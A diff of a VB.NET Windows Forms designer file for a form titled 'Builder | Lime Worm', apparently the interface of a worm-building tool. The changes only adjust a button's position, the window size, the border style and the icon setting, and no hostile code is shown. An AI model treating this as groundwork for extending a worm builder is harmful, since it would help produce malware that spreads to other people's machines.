@@ -95,7 +95,7 @@ Partial Class Builder
         Me.ChButton1.Customization = "AGQA/wD/AP8AgAD/"
         Me.ChButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
         Me.ChButton1.Image = Nothing
-        Me.ChButton1.Location = New System.Drawing.Point(12, 766)
+        Me.ChButton1.Location = New System.Drawing.Point(12, 742)
         Me.ChButton1.Name = "ChButton1"
         Me.ChButton1.NoRounding = False
         Me.ChButton1.Size = New System.Drawing.Size(371, 76)
@@ -338,15 +338,15 @@ Partial Class Builder
         Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
         Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
         Me.BackColor = System.Drawing.Color.Black
-        Me.ClientSize = New System.Drawing.Size(395, 909)
+        Me.ClientSize = New System.Drawing.Size(395, 961)
         Me.Controls.Add(Me.ChGroupBox3)
         Me.Controls.Add(Me.ChButton1)
         Me.Controls.Add(Me.ChGroupBox2)
         Me.Controls.Add(Me.ChGroupBox1)
-        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog
         Me.MaximizeBox = False
         Me.MinimizeBox = False
         Me.Name = "Builder"
+        Me.ShowIcon = False
         Me.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide
         Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
         Me.Text = "Builder | Lime Worm"
